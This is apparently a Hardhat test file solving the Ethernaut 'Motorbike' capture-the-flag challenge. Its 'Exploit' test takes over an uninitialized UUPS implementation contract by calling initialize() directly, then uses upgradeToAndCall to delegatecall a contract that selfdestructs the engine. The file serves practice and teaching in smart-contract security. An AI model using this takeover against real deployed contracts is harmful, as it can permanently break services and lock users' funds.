const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable ?

Things that might help:

- EIP-1967
- UUPS upgradeable pattern
- Initializable contract

*/

describe("[Challenge] Motorbike", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    // Logic Contract
    this.engine = await (
      await ethers.getContractFactory("Engine", deployer)
    ).deploy();

    // Base Contract
    this.motorbike = await (
      await ethers.getContractFactory("Motorbike", deployer)
    ).deploy(this.engine.address);

    // instance
    this.instance = await (
      await ethers.getContractFactory("Engine", deployer)
    ).attach(this.motorbike.address);

    const upgrader = await this.instance.upgrader();
    expect(upgrader).to.eq(deployer.address);

    const horsePower = await this.instance.horsePower();
    expect(horsePower.toString()).to.eq("1000");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    //
    // Call `initialize()` to become the upgrader
    //
    // failed - contract is already initialized
    // await this.instance.connect(attacker).initialize();

    // Call engine contract directly - which is not initialized
    await this.engine.connect(attacker).initialize();

    const upgrader = await this.engine.upgrader();
    expect(upgrader).to.eq(attacker.address);

    // Deploy selfdestruct contract
    this.motorbikeAttack = await (
      await ethers.getContractFactory("MotorbikeAttack", attacker)
    ).deploy();

    // In context of engine contract, delegate call malicious contract - selfdestruct
    const iface = new ethers.utils.Interface(["function explode()"]);
    const explode_enc = iface.encodeFunctionData("explode", []);
    await this.engine
      .connect(attacker)
      .upgradeToAndCall(this.motorbikeAttack.address, explode_enc);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    this.motorbikeFactory = await (
      await ethers.getContractFactory("MotorbikeFactory", deployer)
    ).deploy();
    await this.motorbikeFactory.validateInstance(this.engine.address);
    const validate = await this.motorbikeFactory.validate();
    expect(validate).to.eq(true);
  });
});
